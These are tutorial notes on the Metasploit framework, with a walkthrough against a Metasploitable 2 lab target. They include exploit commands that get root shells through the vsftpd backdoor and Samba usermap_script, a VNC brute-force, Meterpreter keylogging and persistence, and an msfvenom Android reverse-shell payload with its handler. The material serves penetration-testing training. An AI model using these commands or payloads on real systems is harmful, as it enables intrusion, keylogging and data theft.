# O.R. 5.1 - Metasploit Tutorial for Beginners – Basics to Advanced

## Overview

- **Metasploit** – the most widely used penetration testing framework; all-in-one tool for multiple phases of a pentest.
- Allows: finding vulnerabilities, using existing exploits, creating custom exploits/payloads, post-exploitation.
- Written in Ruby – extensible framework with custom modules.
- **Version used:** Metasploit Framework 6 on Kali Linux.

---

## Installation

### Linux (Debian/Ubuntu)

```bash
apt install metasploit-framework
```

### Red Hat/CentOS

```bash
yum install metasploit-framework
```

### Verify Installation

```bash
msfconsole
```

### Update Metasploit (Kali)

```bash
apt update && apt install metasploit-framework
```

---

## Penetration Testing Steps (Refresher)

| Phase | Description |
|-------|-------------|
| **Information Gathering / Reconnaissance** | Gather target info (open ports, services, DNS, etc.) using tools like Nmap, whois. |
| **Vulnerability Analysis** | Analyze potential vulnerabilities; Metasploit's database is useful here. |
| **Exploitation** | Use exploits to compromise the target. |
| **Post Exploitation** | After access: privilege escalation, persistence, data exfiltration. |
| **Report** | Document findings and recommendations. |

---

## Metasploit Framework Basics

### Modules

| Module | Purpose |
|--------|---------|
| **Exploits** | Programs that attack vulnerabilities. |
| **Payloads** | Code that runs after exploitation (e.g., reverse shell, bind shell, Meterpreter). |
| **Auxiliaries** | Scanners, sniffers, etc. – not direct exploits. |
| **Encoders** | Obfuscate payloads to evade detection. |
| **Evasion** | New module for AV/IDS evasion. |
| **Nops** | No-operation instructions – add randomness to payloads. |
| **Post** | Post-exploitation modules. |

### Components

| Component | Purpose |
|-----------|---------|
| **msfconsole** | Main command-line interface. |
| **msfdb** | PostgreSQL database for organizing scan results. |
| **msfvenom** | Payload generator. |
| **Meterpreter** | Advanced payload with extensive post-exploitation features. |

### Metasploit Directory

```bash
cd /usr/share/metasploit-framework/
```

- `modules/` – contains exploits, payloads, auxiliaries, etc.
- Exploit example: `modules/exploits/linux/samba/trans2open.rb`

---

## Core Metasploit Commands

| Command | Purpose |
|---------|---------|
| `help` | List all commands. |
| `show exploits` / `show payloads` / `show auxiliaries` | List available modules. |
| `search <keyword>` | Search for modules (e.g., `search vsftpd`). |
| `use <module>` | Select a module (e.g., `use exploit/unix/ftp/vsftpd_234_backdoor`). |
| `info` | Show module description and options. |
| `show options` | Show required/settable options. |
| `set <OPTION> <value>` | Set a value (e.g., `set RHOSTS 192.168.74.129`). |
| `setg <OPTION> <value>` | Set globally across modules. |
| `show payloads` | Show compatible payloads for the selected exploit. |
| `set payload <payload>` | Select a payload. |
| `check` | Test if target is vulnerable (if supported). |
| `exploit` / `run` | Execute the exploit. |
| `background` | Background an active session. |
| `sessions` | List active sessions. |
| `sessions -i <id>` | Interact with a session. |
| `sessions -u <id>` | Upgrade shell to Meterpreter. |
| `sessions -k <id>` | Kill a session. |

---

## Penetration Test Walkthrough (Metasploitable 2)

### Target Info

- **Target IP:** `192.168.74.129`
- **Attacker IP:** `192.168.74.128`

### Step 1: Host Discovery

```bash
nmap -sn 192.168.74.129
```

### Step 2: Port Scanning & Service Detection

```bash
nmap -sV 192.168.74.129
```

**Key Services Found:**
- Port 21: vsftpd 2.3.4
- Port 22: OpenSSH 4.7p1
- Port 445: Samba smbd 3.X – 4.X
- Port 5900: VNC (protocol 3.3)
- Port 6667: UnrealIRCd
- Port 8180: Apache Tomcat

### Step 3: Vulnerability Analysis

Search for vulnerabilities in Metasploit:

```bash
msfconsole
search vsftpd
```

**Result:** `exploit/unix/ftp/vsftpd_234_backdoor`

### Step 4: Exploitation – vsftpd 2.3.4

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.74.129
show options
exploit
```

**Result:** Root shell obtained.

```bash
whoami
root
```

### Step 5: Exploitation – Samba (usermap_script)

First, detect Samba version:

```bash
search smb_version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.74.129
set THREADS 16
run
```

**Result:** Samba 3.0.20-Debian.

Search for exploit:

```bash
search usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.74.129
exploit
```

**Result:** Root shell.

### Step 6: Exploitation – VNC Brute-Force

```bash
search scanner vnc
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.74.129
set STOP_ON_SUCCESS true
set THREADS 32
set USER_AS_PASS true
run
```

**Result:** `Login Successful: :password`

Connect via VNC:

```bash
vncviewer 192.168.74.129
# Password: password
```

---

## Post-Exploitation & Meterpreter

### Upgrade Shell to Meterpreter

```bash
sessions
sessions -u 2    # Upgrade session 2
sessions -i 3    # Interact with new Meterpreter session
```

### Meterpreter Commands

| Command | Purpose |
|---------|---------|
| `help` | List all Meterpreter commands. |
| `getpid` | Get current process ID. |
| `ps` | List running processes. |
| `search -f <filename>` | Search for files. |
| `download <file>` | Download file from victim. |
| `upload <file>` | Upload file to victim. |
| `shell` | Drop to system shell. |
| `ifconfig` | Network info. |
| `arp` | ARP cache. |
| `netstat` | Network connections. |
| `keyscan_start` / `keyscan_dump` | Capture keystrokes (Windows). |
| `migrate <pid>` | Migrate to another process (Windows). |

### Persistence

**Windows:** `run persistence` (deprecated – use `exploit/windows/local/persistence`).

**Linux:** Use **cron jobs** to maintain persistence.

---

## Creating Custom Payloads with msfvenom

### List Payloads

```bash
msfvenom -l payloads
msfvenom -l payloads | grep android
```

### Create Android APK Payload

```bash
msfvenom -p android/meterpreter/reverse_tcp -e ruby/base64 LHOST=192.168.74.128 LPORT=8080 -o /root/Desktop/payload.apk
```

### Set Up Handler

```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.74.128
set LPORT 8080
exploit
```

---

## Quick Reference

### Core Metasploit Flow

```
msfconsole
search <vulnerability>
use <module>
show options
set RHOSTS <target_ip>
set payload <payload>
set LHOST <attacker_ip>
exploit
```

### Useful Commands

| Command | Purpose |
|---------|---------|
| `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -o <output>` | Generate payload. |
| `msfvenom -l encoders` | List encoders. |
| `msfvenom -p <payload> --list-options` | Show payload options. |
| `msfdb init` | Initialize database. |
| `db_import <file>` | Import Nmap scan results. |
| `hosts` | List hosts in database. |

### Key Files/Directories

| Path | Contents |
|------|----------|
| `/usr/share/metasploit-framework/` | Main installation directory. |
| `/usr/share/metasploit-framework/modules/` | Exploits, payloads, auxiliaries. |
| `/usr/share/metasploit-framework/data/wordlists/` | Wordlists (e.g., `vnc_passwords.txt`). |

---

## Key Takeaways

- **Metasploit** is the Swiss Army knife of penetration testing – covers recon, exploitation, and post-exploitation.
- **Modules** are organized into exploits, payloads, auxiliaries, encoders, and post modules.
- **`search`** and **`use`** are the two most important commands – find and select modules.
- Always **`show options`** and set required values (`RHOSTS`, `LHOST`, `LPORT`).
- **Meterpreter** is the most powerful payload – offers file transfer, keylogging, screen capture, and more.
- **`msfvenom`** lets you create custom payloads for various platforms (Android, Windows, Linux).
- **Persistence** is achieved differently on Windows (persistence module) and Linux (cron jobs).
- **Always use check** (if available) before running an exploit.
- **Metasploitable 2** is a great practice target – but modern systems are much harder to exploit.
- **Defender mindset:** Monitor for Metasploit activity (port scans, exploit attempts, Meterpreter connections) and harden systems against common vulnerabilities.